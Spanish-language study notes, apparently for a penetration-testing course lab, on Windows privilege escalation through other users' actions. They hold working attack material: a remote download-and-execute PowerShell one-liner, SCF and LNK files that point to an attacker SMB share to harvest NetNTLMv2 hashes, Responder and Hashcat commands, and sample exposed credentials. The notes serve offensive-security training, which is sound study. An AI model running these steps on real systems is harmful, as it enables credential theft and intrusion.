
Cuando no encontramos vectores directos de escalada de privilegios, podemos aprovechar la interacción de otros usuarios para:

- Capturar credenciales transmitidas por la red.
    
- Detectar contraseñas expuestas en argumentos de procesos.
    
- Aprovechar aplicaciones vulnerables que requieren interacción.
    
- Capturar hashes NetNTLMv2 mediante archivos `.scf` o `.lnk`.
    

---

## 1. Captura de tráfico de red

Si **Wireshark** está instalado, un usuario sin privilegios podría capturar tráfico si el acceso al controlador **Npcap** no está restringido a administradores.

Esto puede permitir descubrir credenciales transmitidas en texto plano mediante protocolos como FTP.

### Herramientas

- **Wireshark:** captura y análisis de tráfico.
    
- **tcpdump:** captura de paquetes desde Linux.
    
- **net-creds:** extracción de contraseñas y hashes desde tráfico de red o archivos PCAP.
    

Durante una evaluación, podemos capturar tráfico y analizarlo posteriormente para identificar credenciales útiles para la escalada de privilegios o el movimiento lateral.

## 2. Monitorización de líneas de comandos de procesos

Algunos procesos y tareas programadas ejecutan comandos que incluyen credenciales directamente en sus argumentos.

Podemos monitorizar los procesos para detectar estos comandos cuando se ejecuten.

### Script PowerShell

```
while($true)
{
    $process = Get-WmiObject Win32_Process | Select-Object CommandLine

    Start-Sleep 1

    $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine

    Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

El script:

1. Obtiene las líneas de comandos de los procesos.
    
2. Espera un segundo.
    
3. Vuelve a obtenerlas.
    
4. Compara ambas capturas para detectar cambios.
    

### Ejecutar el script desde nuestra máquina

Podemos alojar `procmon.ps1` en un servidor HTTP y ejecutarlo en el objetivo:

```
IEX (iwr 'http://10.10.10.205/procmon.ps1')
```

### Ejemplo de credenciales expuestas

```
net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd
```

Aquí encontramos:

```
Usuario: inlanefreight\sqlsvc
Contraseña: My4dm1nP@s5w0Rd
Recurso: \\sql02\backups
```

Estas credenciales podrían permitir acceder a otros equipos o recursos compartidos.

**Importante:** solo podremos observar las líneas de comandos que nuestro usuario tenga permisos para consultar.

## 3. Servicios vulnerables que requieren interacción

Algunas aplicaciones presentan vulnerabilidades que permiten ejecutar archivos controlados por usuarios con pocos privilegios cuando otro usuario realiza una acción.

### Ejemplo: Docker Desktop – CVE-2019-15752

Afecta a versiones de Docker Desktop Community Edition anteriores a `2.1.0.1`.

Docker buscaba determinados archivos, como:

```
docker-credential-wincred.exe
docker-credential-wincred.bat
```

En el directorio:

```
C:\PROGRAMDATA\DockerDesktop\version-bin\
```

El problema era que el grupo `BUILTIN\Users` tenía permisos de escritura sobre ese directorio.

Esto permitía colocar un archivo ejecutable que podría iniciarse cuando:

1. Se iniciara Docker Desktop.
    
2. Un usuario ejecutara `docker login`.
    

La ejecución dependería de la interacción del usuario y se produciría con los privilegios del proceso que lo ejecutase.

### Qué comprobar

Enumerar siempre:

- Software instalado.
    
- Versiones de las aplicaciones.
    
- Directorios con permisos de escritura.
    
- Aplicaciones que cargan ejecutables desde ubicaciones modificables.
    
- Procesos cuya ejecución depende de acciones de otros usuarios.

## 4. Captura de hashes NetNTLMv2 mediante archivos SCF

Los archivos **Shell Command File (**`**.scf**`**)** son utilizados por el Explorador de Windows.

Podemos configurar su campo `IconFile` para que apunte a un recurso SMB controlado por nosotros.

Cuando un usuario navega por la carpeta que contiene el archivo, el Explorador puede intentar acceder a ese recurso y realizar una autenticación SMB.

Esto puede exponer una respuesta de autenticación **NetNTLMv2**.

### 4.1. Crear un archivo SCF

Creamos un archivo llamado:

```
@Inventory.scf
```

Contenido:

```
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico

[Taskbar]
Command=ToggleDesktop
```

Donde:

- `10.10.14.3`: IP de nuestra máquina atacante.
    
- `share`: recurso SMB al que intentará acceder Windows.
    
- `legit.ico`: nombre del icono solicitado.
    

El carácter `@` permite que el archivo aparezca cerca del principio del directorio.

### 4.2. Colocar el archivo en un recurso compartido

Necesitamos acceso de escritura a una carpeta que otros usuarios visiten.

Cuando un usuario abra esa carpeta con el Explorador, Windows puede intentar cargar el icono desde nuestra dirección SMB.

### 4.3. Iniciar Responder

En nuestra máquina atacante:

```
sudo responder -w -v -I tun0
```

Donde `tun0` es la interfaz VPN utilizada en el laboratorio.

Responder permanecerá escuchando conexiones y posibles autenticaciones.

### 4.4. Capturar el hash

Ejemplo de resultado:

```
[SMB] NTLMv2-SSP Client   : 10.129.43.30
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:...
```

Hemos capturado una respuesta de autenticación NetNTLMv2 del usuario `Administrator`.

**Importante:** no hemos obtenido directamente el hash NT almacenado en SAM, sino una respuesta NetNTLMv2 que podemos intentar crackear offline.

### 4.5. Crackear el hash con Hashcat

Guardamos la respuesta capturada en un archivo:

```
nano hash
```

Ejecutamos:

```
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

Parámetros:

- `-m 5600`: modo NetNTLMv2.
    
- `hash`: archivo con la respuesta capturada.
    
- `rockyou.txt`: diccionario de contraseñas.
    

En el ejemplo de Academy se recupera:

```
WINLPE-SRV01\Administrator
Welcome1
```

La contraseña recuperada podría utilizarse para autenticarnos en servicios donde esa cuenta tenga acceso.

**Nota del laboratorio:** después de iniciar Responder, esperar entre **2 y 5 minutos** para que el usuario simulado visite el recurso compartido.

## 5. Captura de hashes mediante archivos LNK

La técnica anterior con archivos `.scf` ya no funciona en Windows Server 2019 según el material de Academy.

Como alternativa podemos utilizar accesos directos de Windows (`.lnk`) que hagan referencia a recursos de red.

### 5.1. Crear un archivo LNK con PowerShell

```
$objShell = New-Object -ComObject WScript.Shell

$lnk = $objShell.CreateShortcut("C:\legit.lnk")

$lnk.TargetPath = "\\<attackerIP>\@pwn.png"

$lnk.WindowStyle = 1

$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"

$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."

$lnk.HotKey = "Ctrl+Alt+O"

$lnk.Save()
```

Sustituimos:

```
<attackerIP>
```

Por nuestra dirección IP.

### 5.2. Funcionamiento

1. Creamos el archivo `.lnk`.
    
2. Lo colocamos en un directorio al que accedan otros usuarios.
    
3. El acceso directo contiene una referencia a una ruta UNC.
    
4. Windows puede intentar acceder al recurso SMB remoto.
    
5. Responder puede capturar la respuesta de autenticación.
    
6. Podemos intentar recuperar la contraseña mediante un ataque de diccionario.
    

### Herramientas

También podemos utilizar herramientas como **Lnkbomb** para generar estos accesos directos.

## 6. Diferencias entre SCF y LNK

|Característica|SCF|LNK|
|---|---|---|
|Extensión|`.scf`|`.lnk`|
|Creación|Archivo de texto|PowerShell o herramientas|
|Mecanismo|Referencia UNC en `IconFile`|Referencia UNC en el acceso directo|
|Objetivo|Provocar autenticación SMB|Provocar autenticación SMB|
|Windows Server 2019|La técnica descrita no funciona|Alternativa presentada por Academy|
|Herramienta de captura|Responder|Responder|

## 7. Metodología práctica para CPTS/OSCP

### Enumeración inicial

**1. Comprobar si podemos capturar tráfico.**

Buscar Wireshark/Npcap y comprobar si nuestro usuario tiene acceso a la captura de paquetes.

**2. Monitorizar los procesos.**

Utilizar el script de PowerShell para identificar argumentos que puedan contener contraseñas.

**3. Enumerar aplicaciones instaladas.**

Buscar software vulnerable y directorios modificables por usuarios sin privilegios.

**4. Enumerar recursos compartidos.**

Identificar carpetas donde tengamos permisos de escritura y que sean utilizadas por otros usuarios.

**5. Comprobar la posibilidad de capturar autenticaciones SMB.**

En el laboratorio, utilizar archivos SCF o LNK y escuchar con Responder.

**6. Analizar las credenciales obtenidas.**

Si conseguimos una respuesta NetNTLMv2, intentar recuperar la contraseña offline con Hashcat.

## 9. Puntos clave para el examen

- **Npcap:** puede permitir capturar tráfico sin privilegios administrativos si su acceso no está restringido.
    
- **Monitorización de procesos:** útil para descubrir contraseñas introducidas como argumentos.
    
- **Aplicaciones vulnerables:** comprobar directorios escribibles y acciones que puedan desencadenar la ejecución de archivos.
    
- **SCF:** permite provocar solicitudes de autenticación SMB mediante una referencia UNC en `IconFile`.
    
- **LNK:** alternativa a SCF en sistemas donde la técnica anterior no funciona.
    
- **Responder:** permite capturar respuestas de autenticación NetNTLMv2.
    
- **Hashcat** `**-m 5600**`**:** modo utilizado para intentar crackear NetNTLMv2.
    
- **Interacción del usuario:** estas técnicas dependen de que otro usuario realice una acción; no garantizan por sí solas una escalada de privilegios.
    

**Idea principal:** si la enumeración local no revela una vía directa de escalada, debemos comprobar si podemos obtener credenciales mediante tráfico de red, argumentos de procesos o interacciones de otros usuarios con archivos y aplicaciones.
